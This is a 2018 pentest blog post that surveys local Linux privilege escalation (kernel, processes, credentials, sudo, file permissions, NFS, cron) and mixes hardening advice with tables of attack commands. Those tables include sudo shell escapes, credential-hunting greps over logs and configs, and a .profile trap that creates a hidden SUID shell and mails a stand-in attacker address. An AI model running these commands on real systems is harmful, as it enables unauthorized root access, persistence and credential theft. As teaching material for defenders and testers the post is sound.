---
layout: post
title:  "Local Linux privilege escalation"
date:   2018-09-27 09:00:00
tags: System Pentest
author: Antoine Brunet
permalink: linux-privilege-escalation.html
article_folder: ""
comments: true
description: "Overview of privilege escalation, using many different technics."
keywords: ""
---

# Summary

- [I. Introduction](#i-introduction)
- [II. Kernel](#ii-kernel)
    - [1. Kernel privilege escalation overview](#1-kernel-privilege-escalation-overview)
    - [2. Kernel information gathering](#2-kernel-information-gathering)
- [III. Process](#iii-process)
    - [1. Process privilege escalation overview](#1-process-privilege-escalation-overview)
    - [2. Process information gathering](#2-process-information-gathering)
- [IV. Mining credentials information](#iv-mining-credentials-information)
    - [1. Mining sensitive information for gain a privilege escalation](#1-mining-sensitive-information-for-gain-a-privilege-escalation)
    - [2. Useful commands to mine credentials](#2-useful-commands-to-mine-credentials)
    - [3. Useful tools to mine credentials](#3-useful-tools-to-mine-credentials)
- [V. Sudo](#v-sudo)
    - [1. Sudo overview](#1-sudo-overview)
    - [2. Sudo information gathering](#2-sudo-information-gathering)
    - [3. Example of sudo abuse to escalate your privileges](#3-example-of-sudo-abuse-to-escalate-your-privileges)
- [VI. File permission](#vi-file-permission)
    - [1. File permission overview](#1-file-permission-overview)
    - [2. File permission information gathering](#2-file-permission-information-gathering)
- [VII. Network File System](#vii-network-file-system)
    - [1. NFS overview](#1-nfs-overview)
    - [2. NFS information gathering](#2-nfs-information-gathering)
    - [3. Few ideas to realize a NFS privilege escalation](#3-few-ideas-to-realize-a-nfs-privilege-escalation)
- [VIII. Cron](#viii-cron)
    - [1. Cron privilege escalation overview](#1-cron-privilege-escalation-overview)
    - [2. Cron information gathering](#2-cron-information-gathering)
- [IX. Other useful information which can be gathered](#ix-other-useful-information-which-can-be-gathered)


# I. Introduction

When an attacker succeeds to establish the initial foothold (gain access to a user with restricted privileges), he will seek for a way to increase his privileges (Gain access to another user with more privileges). We call this action a privilege escalation. It can happen in all sort of applications or systems. This article will only describe it in the Linux system.

This article will try to give a complete overview of all Linux privilege escalation techniques. It separates the local Linux privilege escalation in different scopes: kernel, process, mining credentials, sudo, cron, NFS, and file permission. For each, it will be gave a quick overview, some good practices, some information gathering commands, and an explanations the techniques an attacker can use to realize a privilege escalation.
Do not hesitate to share with us your techniques in the comments.

For helping you to gather information you can use this script [unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check).

# II. Kernel

## 1. Kernel privilege escalation overview

A kernel privilege escalation is done with a kernel exploit, and generally give the root access.

There is no way to completely avoid a kernel privilege escalation. But some good practices are good to know. The first one is to always be aware about security reports and keeping your system up to date.

For a kernel privilege escalation the attacker will use a kernel exploit. For that he will need three conditions:

1. A working exploit
1. The ability to transfer the exploit onto the target
1. The ability to execute the exploit on the target

We are never protected against a kernel vulnerability. So even if you or your company are aware about IT security and are following the CVS publication, you cannot be sure that your system is hundred percent secured.

For this reason you must influence the last two points. A good practice will be to focus on restricting or removing programs that enable file transfers, such as FTP, SCP, wget, curl or any programs which can permit to realize file transfers. If you need these programs, restrict them to specific users, or IP/domains more they will be restricted and better it will be.

It is also a good practice to remove or restrict the access of all the compilers such as gcc.

Another good practice is to limit directories that are writable or executable, particularly by service dedicated users (such as www-data for Apache).

Finally, it is a really important to externalized logs in an other machine.

## 2. Kernel information gathering

Some basic command to collect some clue for realized a Linux kernel exploitation

| Command                | Result                            |
| :-------------------- | :------------------------------- |
| `uname -a` | Print all available system information   |
| `uname -m` | Linux kernel architecture (32 or 64 bit) |
| `uname -r` | Kernel release |
| `uname -n` or `hostname` | System hostname |
| `cat /proc/version` | Kernel information |
| `cat /etc/*-release` or `cat /etc/issue` | Distribution information |
| `cat /proc/cpuinfo` | CPU information |
| `df -a` | File system information |
| `dpkg --list 2>/dev/null| grep compiler |grep -v decompiler 2>/dev/null && yum list installed 'gcc*' 2>/dev/null| grep gcc 2>/dev/null` | List available compilers |

# III. Process

## 1. Process privilege escalation overview

Most of the time an attacker succeeds to establish the initial foothold by using a misconfigured or vulnerable running service, but it does not stop there. An attacker can use a process which is only accessible locally for doing privilege escalation. For example, a vulnerable MySQL database running as root.

Commonly the method attack will be similar than for a kernel privilege escalation. The attacker will use an exploit, and for that he will need the three conditions we see [upper](#kernel-privilege-escalation-overview). Also all the good practice explained in the kernel section can be transposed for the running processes.

A good practice for all your sensitive services (a service which can be accessed from the outside is definitely sensitive) is to run them into a `chroot jail`, at least creating a dedicated user. Never run them as root.

## 2. Process information gathering

Some basic command to collect some clue to realize a privilege escalation by passing through a vulnerable process exploitation.

| Command                | Result                            |
| :-------------------- | :------------------------------- |
| `ps aux | grep root` | Display service run as root |
| `ps aux | awk '{print $11}'|xargs -r ls -la -- 2>/dev/null | uniq` | Display process binary permission |
| `cat /etc/inetd.conf` or `cat /etc/xinetd.conf` | List services managed by inetd |
| `dpkg -l` | Installed packages (Ubuntu, Debian) |
| `rpm -qa` | Installed packages (RedHat, Fedora Core, Suse Linux, Cento) |
| `pkg_info` | Installed packages (OpenBSD, FreeBSD) |
| `httpd -v` or `apache2 -v` | Apache version |
| `apache2ctl (or apachectl) -M` | List loaded Apache modules |
| `cat /etc/apache2/envvars 2>/dev/null |grep -i 'user|group' |awk '{sub(/.*export /,"")}1'`| Which account is Apache running as |
| `mysql --version` | MYSQL version |
| `psql -V` | Postgres version |

# IV. Mining credentials information

## 1. Mining sensitive information for gain a privilege escalation

On a server (it is much more true for a personal computer) you can find many different sensitive information like login, password, private and public keys, certificates... Theses information can be found and used to access to another machine, application or for realized a privilege escalation.

To prevent this kind of leak, you should take care of the access permission of the sensitive directories, and files. For example the directory `/home/<user>/.ssh` can normally only be read and write by the owner user (`chmod 600`) or the `/etc/shadow` file which is normally in read write for the root user and in read for the root group (`chomd 640`).

It is also really important to never put any credentials in any code or configuration file. If for any reason, you have to do it, be sure the password is not in clear and the script or config file has specific permission that only allow, authorized users to read/write it.

## 2. Useful commands to mine credentials

Here some few commands which can be useful for finding credentials on a Linux system.

| Command                | Result                            |
| :-------------------- | :------------------------------- |
| `history` | Displays command history of current user |
| `history | grep -B4 -A3 -i 'passwd\|ssh\|host\|nc\|ping' 2>/dev/null` | Check history for interesting information |
| `grep -B3 -A3 -i 'pass\|password\|login\|username\|email\|mail\|host\|ip' /var/log/*.log 2>/dev/null` | Check log file in `/var/log` for password, login, or email information |
| `find / -maxdepth 4 -name '*.conf' -type f -exec grep -Hn 'pass\|password\|login\|username\|email\|mail\|host\|ip' {} \; 2>/dev/null` | Find the configuration files which contain interesting information |

## 3. Useful tools to mine credentials

Here few tools than can be usefull and help you in your job.

- [Pupy](https://github.com/n1nj4sec/pupy/)
- [LaZagne](https://github.com/AlessandroZ/LaZagne)
- [gimmecredz](https://github.com/0xmitsurugi/gimmecredz)

# V. Sudo

## 1. Sudo overview

The `sudo` command give the possibility to a user to execute a command as another user (usually the root account).
A misconfiguration of the sudo command can easily lead to a privilege escalation.

To prevent it, there are few good practices:

Grant the minimum privileges to perform necessary tasks or operations, be the more specific than you can. For example if you want to allow a user to listen on a specific interface (`eth0`) with `tcpdump`. You should configure `sudo` as follow `user ALL= (root)   NOPASSWD: /usr/sbin/tcpdump -ttteni eth0`. This configuration will permit to `user` to execute this exact command `/usr/sbin/tcpdump -ttteni eth0` as root he will have to use this exact options in the same order or it will note work.

Never configure `sudo` like that `user	ALL=NOPASSWD:ALL`.

Do not allow some commands that can permit to execute some code like `vi`, `find`, `bash`, `awk`, `perl` ...

## 2. Sudo information gathering

Here the command you need to get some clues about your the possibilities you have to realize a privilege escalation using `sudo`.

| Command                | Result                            |
| :-------------------- | :------------------------------- |
| `sudo -l` or `sudo -lll` | List the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host |
| `sudo -V` | Sudo version |

## 3. Example of sudo abuse to escalate your privileges

Here examples of commands an attacker can use for escalating his privileges.

\* I have found most of those commands on the blog [Le journal d'un reverser](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)

| Command                | Explanation                            |
| :-------------------- | :------------------------------- |
| `sudo su` | Become root |
| `perl -e 'exec "/bin/bash";'` | Launch a bash as root |
| `python -c 'import pty;pty.spawn("/bin/bash")'` | Launch a bash as root |
| When you execute one of theses program `less`, `more`, `nano`, `vi`, the `man`, `ftp`, `mysql`, `psql` you can execute some code into like that `!bash` | Launch a bash as root |
| `awk 'BEGIN {system("/bin/bash")}'` | Launch a bash as root |
| `find /home -exec /bin/bash \;` | Launch a bash as root |
| `tcpdump -n -i lo -G1 -w /dev/null -z ./payload.sh` | Execute the program payload.sh as root |
| `tar c a.tar -I ./payload.sh a` | Execute the program payload.sh as root |
| `zip z.zip a -T -TT ./payload.sh` | Execute the program payload.sh as root |
| `man -P /tmp/payload.sh man` | Execute the program payload.sh as root |
| `export PAGER=./payload.sh` `git -p help`| Execute the program payload.sh as root |
| `export PATH=/tmp:$PATH` `ln -sf /tmp/payload.sh /tmp/git-help` `git --exec-path=/tmp help` | Execute the program payload.sh as root |
| `ls -la .bashrc` `export HOME=.` `bash` | Launch a bash as root |
| `nmap --interactive` `!bash` | Launch a bash as root |

# VI. File permission

## 1. File permission overview

There are a few possibilities to realize a privilege escalation with misconfigured file permission.

First, if you let the read access of a sensitive file like a private key, or a script running as daemon or in the cron.

SUID (Set User ID) or SGID (Set Group ID) files must be as much as possible avoided.
They are needed for tasks that require higher privileges than those which common users have, such as `passwd` command.

```sh
ls -la /usr/bin/passwd
-rwsr-xr-x 1 root root 47032 May 16  2017 /usr/bin/passwd
```

An attacker can also set up some traps. He can add to the `.profile` some code like this one: `cp /bin/bash /tmp/.hiddenShell && chmod 4777 /tmp/.hiddenShell && mail –s "Shell done" attacker@badguy.co`. This will create a hidden shell `/tmp/.hiddenShell` with the SUID activate and full permissions for all users, finally it will send an email to the attacker. There are plenty of different traps that can be done, the imagination is the only limit.

## 2. File permission information gathering

Some basic commands to collect some clues to realize a privilege escalation abusing file permission.

| Command                | Result                            |
| :-------------------- | :------------------------------- |
| `find / -perm -4000 -type f 2>/dev/null` | Find SUID files |
| `find / -uid 0 -perm -4000 -type f 2>/dev/null` | Find SUID files owned by root |
| `find / -perm -2000 -type f 2>/dev/null` | Find SGID files (sticky bit) |
| `find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null` | Find world-writeable files excluding `proc` file |
| `find / -type f '(' -name *.cert -or -name *.crt -or -name *.pem -or -name *.ca -or -name *.p12 -or -name *.cer -name *.der ')' '(' '(' -user support -perm -u=r ')' -or '(' -group support -perm -g=r ')' -or '(' -perm -o=r ')' ')' 2> /dev/null-or -name *.cer -name *.der ')' 2> /dev/null` | Find keys or certificates you can read |
| `find /home –name *.rhosts -print 2>/dev/null` | Find rhost config files |
| `find /etc -iname hosts.equiv -exec ls -la {} 2>/dev/null ; -exec cat {} 2>/dev/null ;` | Find hosts.equiv, list permissions and cat the file contents |
| `cat ~/.bash_history` | Display current user history |
| `ls -la ~/.*_history` | Dislay the current user various history files |
| `ls -la ~/.ssh/` | Check current user's ssh files |
| `find /etc -maxdepth 1 -name '*.conf' -type f` or `ls -la /etc/*.conf` | List the configuration files in /etc (depth 1, modify the maxdepth param in the first command for change it) |
| `lsof | grep '/home/\|/etc/\|/opt/'` | Display the possibly interesting openfiles |

# VII. Network File System

## 1. NFS overview

"The Network File System (NFS) is a distributed filesystem that allows users to mount remote filesystems as if they were local. NFS uses a client-server model, in which a server exports directories to be shared, and clients mount the directories to access the files in them. NFS eliminates the need to keep copies of files on several machines by letting the clients all share a single copy of a file on the server."

This definition come from the book :
`Linux in a Nutshell, 3rd Edition` By `Ellen Siever, Stephen Spainhour, Stephen Figgins and Jessica P. Hekman`.

When this service is running on our server we must be very careful and follow some good practices.

We must never configure a file system with `no_root_squash` which will mean that we allow the remote user to write in the server file system as root.

We should specify on `/etc/hosts.allow` the allowed users fore our NFS.

Sometime using NFS can be just replace by a [sshfs](https://linux.die.net/man/1/sshfs).

## 2. NFS information gathering

| Command                | Result                            |
| :-------------------- | :------------------------------- |
| `nmap -sV --script=nfs-showmount <IP Server>` | This nmap script will give you the information about the NFS |
| `showmount -e <IP Server>` | Same as the nmap script bellow but you will have to install a client `apt-get install nfs-common` |

## 3. Few ideas to realize a NFS privilege escalation

There is plenty of possibilities to realize a privilege escalation on a NFS, like:
- create a file giving a shell with the SUID permission.
- create or modify the file `~/.ssh/authorized_keys` with your public key.
- set the SUID permission to a handmade script, or a binary (`/bin/sh`, `/usr/bin/vi`) which will permit to get a shell console.
- modify the `/etc/shadow` and the `/etc/passwd` to create a new user or to change the password of one already existing.
- modify the `sudo` configuration file

# VIII. Cron

## 1. Cron privilege escalation overview

The cron daemon schedules commands to be run at specified dates and times.
It runs commands with specific users. So we can try to abuse it for realise a privilege escalation.

A good way to abuse the cron, is to check the file permissions of the scripts it runs.
If the permissions are not well sets, an attacker can possibly overwrite the file and easily get the privileges of the user set in the cron.

Another way is to use the wildcard tricks which are well explained in this article [Unix Wildcards Gone Wild](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)

Always use the full path for each command and script you run.

Do not use the root user to set commands un the cron.

## 2. Cron information gathering

Some basic command to collect some clue to realize a privilege escalation using a misconfigured cron.

| Command                | Result                            |
| :-------------------- | :------------------------------- |
| `crontab -l` | Display cron of the current user |
| `ls -la /etc/cron*` | Display scheduled jobs overview |

# IX. Other useful information which can be gathered

Those commands are really useful to collect some clue for realized a privilege escalation.

| Command                | Result                            |
| :-------------------- | :------------------------------- |
| `whoami` | Print effective userid |
| `id` | Print real and effective user and group IDs |
| `awk -F ':' '{print $1}' /etc/passwd` | List all users on the system |
| `awk -F ':' '{print $1}' /etc/group` | List all groups on the system |
| `last` | Show listing of last logged in users |
| `lastlog` | Foreach users get the last logged in |
| `for i in $(cat /etc/passwd 2>/dev/null| cut -d":" -f1 2>/dev/null);do id $i;done 2>/dev/null` | List uid and groups for each users |
| `grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'` | List all super users accounts |
| `w` | Show who is logged on and what they are doing |
| `users` or `who -a` | Print the user names of users currently logged in to the current host |
| `cat /etc/shells` | Pathnames of valid login shells |
| `cat /etc/profile` | Display default system variables |
| `cat ~/.profile` | Display user variables and functions |
| `env` | Display environmental variables |
| `route` | Display route information |
| `arp -a` | Display arp table |
| `cat /etc/resolv.conf` | Show configured DNS sever addresses |
| `head /var/mail/root` | Try to read root mail |
| `perl -v` | Perl version |
| `java -version` | Java version |
| `python --version` | Python version|
| `ruby -v` | Ruby version |